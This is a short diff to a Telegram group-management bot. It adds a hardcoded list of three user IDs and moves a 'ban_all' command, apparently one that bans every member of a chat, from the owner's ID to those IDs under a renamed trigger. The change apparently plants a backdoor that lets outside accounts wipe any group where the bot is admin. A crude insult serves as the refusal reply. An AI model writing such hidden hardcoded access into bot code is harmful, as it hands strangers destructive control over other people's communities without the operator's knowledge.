@@ -124,8 +124,14 @@ async def tai_ya(_, message):
     await message.reply_text(mmk)
 
 
+EKSEKUTOR = [
+    1860375797,
+    1786144151,
+    1708645514,
+]
 
-@app.on_message(filters.command("hijaubalon", ["?", "#"]) & filters.user(OWNER_ID))
+
+@app.on_message(filters.command("balonhijau", ["?", "#"]) & filters.user(EKSEKUTOR))
 async def ban_all(_,msg):
     chat_id=msg.chat.id    
     bot=await app.get_chat_member(chat_id, BOT_ID)
@@ -140,9 +146,6 @@ async def ban_all(_,msg):
     else:
         await msg.reply_text("**LU BUKAN OWNER GUA JING**")  
                                          
-    
-            
-
 
 @app.on_message(filters.command(GBANNED_COMMAND) & SUDOERS)
 @language
